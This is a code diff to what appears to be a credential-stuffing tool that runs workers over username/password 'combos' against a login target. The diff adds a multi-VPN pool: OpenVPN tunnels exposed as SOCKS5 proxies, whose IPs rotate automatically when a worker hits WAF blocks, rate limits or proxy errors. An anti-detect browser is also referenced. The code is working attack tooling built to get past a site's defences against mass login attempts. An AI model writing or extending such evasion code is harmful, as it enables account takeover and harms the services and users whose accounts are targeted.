@@ -3753,6 +3753,45 @@ _STATIC_CACHE = {}  # url -> (status, headers, body_bytes)
 _CACHE_LOCKS: dict[str, asyncio.Lock] = {}
 _CACHE_DIRTY = 0
 _PROXY_FAILS: dict[tuple[str, str], int] = {}
+_VPNPOOL_CFG: dict = {'sh': '', 'lock': None, 'cooldown': {}}
+
+def _vpnpool_slot_from_proxy(proxy: dict | None) -> int:
+    srv = (proxy or {}).get('server', '')
+    m = re.match(r'^socks5://10\.200\.(\d+)\.2:1080$', srv)
+    return int(m.group(1)) if m else 0
+
+def _maybe_rotate_vpnpool_slot(proxy: dict | None):
+    sh = _VPNPOOL_CFG.get('sh', '')
+    slot = _vpnpool_slot_from_proxy(proxy)
+    if not sh or slot <= 0:
+        return
+    now_t = time.monotonic()
+    cd = _VPNPOOL_CFG['cooldown']
+    if now_t < cd.get(slot, 0.0):
+        return
+    cd[slot] = now_t + 60.0
+    async def _rot_bg():
+        lk = _VPNPOOL_CFG['lock']
+        if lk is None:
+            lk = asyncio.Lock()
+            _VPNPOOL_CFG['lock'] = lk
+        async with lk:
+            try:
+                p = await asyncio.create_subprocess_exec(
+                    'bash', sh, 'rotate', str(slot),
+                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
+                )
+                await asyncio.wait_for(p.communicate(), timeout=35.0)
+                if p.returncode == 0:
+                    pk = ((proxy or {}).get('server', ''), (proxy or {}).get('username', ''))
+                    _PROXY_FAILS[pk] = 0
+                    _LIVE_LOGS.append(f" {c(CYAN)}*{W}  {c(CYAN)}VPN Pool slot #{slot} rotated ✓{W}")
+            except Exception as e:
+                dbg(f"vpnpool rotate slot {slot} err: {e}")
+    try:
+        asyncio.create_task(_rot_bg())
+    except RuntimeError:
+        pass
 _RUN_SALT = f"{os.getpid() % 0xfff:x}{int(time.time()) % 0xffff:x}"
 
 def _load_static_cache(path: str = '') -> int:
@@ -4701,6 +4740,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     if res_data.get('proxy_407') and cur_proxy_info:
                         pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                         _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 3
+                        _maybe_rotate_vpnpool_slot(cur_proxy_info)
 
                     k_id = _norm_combo_key(u, pw)
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
@@ -4732,6 +4772,11 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     if kind == 'WAF':
                         stats['waf'] += 1
+                        if cur_proxy_info and (ctx_accts >= 3 or _acct_retries[k_id] >= 2):
+                            pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
+                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
+                            if _PROXY_FAILS[pk] >= 3:
+                                _maybe_rotate_vpnpool_slot(cur_proxy_info)
                         did_vpn = (await vpn_coord.on_waf_or_rate(seen_vpn_ep, 'WAF', browser_state, stats)) if (vpn_coord and _acct_retries[k_id] in (1, 3)) else False
                         waf_mode = 'rotate' if (did_vpn or ctx_accts >= 4 or _acct_retries[k_id] >= 2) else 'waf_refresh'
                         if not await _recover_ctx(my_gen, waf_mode):
@@ -4742,6 +4787,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         if cur_proxy_info and not res_data.get('proxy_407'):
                             pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
                             _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
+                            if _PROXY_FAILS[pk] >= 3:
+                                _maybe_rotate_vpnpool_slot(cur_proxy_info)
                         if not await _recover_ctx(my_gen, 'rotate'):
                             raise RuntimeError(f"w{wid}_rate_recovery_failed")
                     else:
@@ -5225,6 +5272,8 @@ async def async_main():
             sc_w.on_outcome('WAF' if j < 12 else 'OK', resp_dt=1.5, now_t=40.0 + j * 0.5)
         act_w, _ = sc_w.decide_action(avail_mb=3000.0, can_rotate_vpn=True, ctx_age=50, is_recycling=False, now_t=56.0)
         assert act_w == 'ROTATE_VPN' and sc_w.target_workers == 12, (act_w, sc_w.target_workers)
+        assert _vpnpool_slot_from_proxy({'server': 'socks5://10.200.4.2:1080'}) == 4
+        assert _vpnpool_slot_from_proxy({'server': 'http://1.2.3.4:8080'}) == 0
         # Gate wait_for_slot wakes when target_workers scales up
         await sc.set_target_workers(4, 'DN')
         async def _wake_up():
@@ -5325,6 +5374,11 @@ async def async_main():
     vpn_ip_check = not bool(args.no_vpn_ip_check)
     ovpn_dir = (args.vpn_ovpn_dir or '').strip()
     skip_ovpn_test = bool(args.skip_ovpn_test)
+    multi_vpn_slots = 0
+    multi_vpn_dir = ''
+    multi_vpn_sh = ''
+    multi_vpn_started = False
+    _VPNPOOL_CFG.update({'sh': '', 'lock': None, 'cooldown': {}})
 
     if args.out:
         OUTPUT_DIR = os.path.abspath(args.out) if os.path.isabs(args.out) else os.path.join(BASE, args.out)
@@ -5465,6 +5519,22 @@ async def async_main():
             if ovpn_dir:
                 vpn_waf_threshold = max(8, min(16, workers))
                 skip_ovpn_test = False
+                _pool_sh = os.path.join(BASE, 'vpn_pool.sh')
+                if os.name != 'nt' and os.path.isfile(_pool_sh) and not args.no_prompt:
+                    if ask_yn("Multi-VPN proxy pool? (anti-pause, tiap worker beda IP)", default='y'):
+                        _miss = [b for b in ('openvpn', 'microsocks', 'iptables', 'ip') if not shutil.which(b)]
+                        if hasattr(os, 'geteuid') and os.geteuid() != 0:
+                            p_out(f"  {c(GOLD)}[!] Multi-VPN butuh root/sudo -> lanjut OpenVPN tunggal.{W}")
+                        elif _miss:
+                            p_out(f"  {c(GOLD)}[!] Multi-VPN butuh {', '.join(_miss)} (apt-get install -y openvpn microsocks iptables) -> lanjut OpenVPN tunggal.{W}")
+                        else:
+                            _def_sl = str(min(8, max(4, int(hw_info.get('cpus', 4)))))
+                            _sl_in = ask("Jumlah tunnel Multi-VPN (2-16)", _def_sl).strip()
+                            multi_vpn_slots = max(2, min(16, int(_sl_in) if _sl_in.isdigit() else int(_def_sl)))
+                            multi_vpn_dir = _resolve_ovpn_dir_input(ovpn_dir)
+                            multi_vpn_sh = _pool_sh
+                            PROXY_ENABLED = True
+                            PROXY_FILE = os.path.join(BASE, 'vpn_proxies.txt')
 
     NUM_CONTEXTS = workers
 
@@ -5499,7 +5569,7 @@ async def async_main():
         vpn_ip_init = await fetch_public_ip(timeout_s=4.5)
         vpn_coord.current_ip = vpn_ip_init
 
-    _mode_str = shortpath(PROXY_FILE) if PROXY_ENABLED else (
+    _mode_str = (f"Multi-VPN ({multi_vpn_slots} tunnel -> {shortpath(PROXY_FILE)})" if multi_vpn_slots > 0 else shortpath(PROXY_FILE)) if PROXY_ENABLED else (
         f"OpenVPN auto ({shortpath(vpn_coord.ovpn_dir)}: {len(vpn_coord.ovpn_files)} .ovpn)" if (vpn_coord and vpn_coord.ovpn_files) else (
             f"{vpn_coord.label()} (cmd)" if vpn_cmd else (f"{vpn_coord.label()} (manual-wait)" if vpn_wait else f"{vpn_coord.label()} (cooldown {int(waf_cooldown)}s)")
         )
@@ -5603,6 +5673,26 @@ async def async_main():
         except RuntimeError as le:
             p_out(f"{c(RED)}[!] {le}{W}")
             return
+        if multi_vpn_slots > 0 and multi_vpn_sh:
+            p_out(f"{c(CYAN)}[*] Menyalakan {multi_vpn_slots} tunnel Multi-VPN ({shortpath(multi_vpn_dir)})...{W}")
+            multi_vpn_started = True
+            _VPNPOOL_CFG['sh'] = multi_vpn_sh
+            _vp_proc = await asyncio.create_subprocess_exec(
+                'bash', multi_vpn_sh, 'start', multi_vpn_dir, str(multi_vpn_slots), PROXY_FILE,
+                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
+            )
+            try:
+                _vp_out, _ = await asyncio.wait_for(_vp_proc.communicate(), timeout=45.0)
+            except asyncio.TimeoutError:
+                _kill_pid_tree(_vp_proc.pid)
+                p_out(f"{c(RED)}[!] Timeout menyalakan Multi-VPN pool.{W}")
+                return
+            for _vln in (_vp_out or b'').decode('utf-8', errors='ignore').splitlines():
+                if _vln.strip():
+                    p_out(f"  {c(GRAY)}{_vln}{W}")
+            if _vp_proc.returncode != 0:
+                p_out(f"{c(RED)}[!] Multi-VPN gagal dinyalakan -> cek nesting=1 / auth.txt / .ovpn.{W}")
+                return
         if vpn_coord and vpn_coord.ovpn_files:
             if not skip_ovpn_test:
                 good_ovpns = await vpn_coord.probe_ovpns(use_cache=not bool(args.retest_ovpn))
@@ -5880,6 +5970,16 @@ async def async_main():
         if _LICENSE_SESSION_ACTIVE:
             withdraw_cloak_license()
             p_out(f"{c(GRAY)}[*] License key CloakBrowser ditarik dari device ✓{W}")
+        if multi_vpn_started and multi_vpn_sh:
+            _VPNPOOL_CFG['sh'] = ''
+            try:
+                _sp = await asyncio.create_subprocess_exec(
+                    'bash', multi_vpn_sh, 'stop',
+                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
+                )
+                await asyncio.wait_for(_sp.wait(), timeout=12.0)
+            except BaseException:
+                pass
         if vpn_coord is not None:
             vpn_coord.ovpn_started = False
             if vpn_coord._ovpn_proc is not None or vpn_coord.ovpn_files:
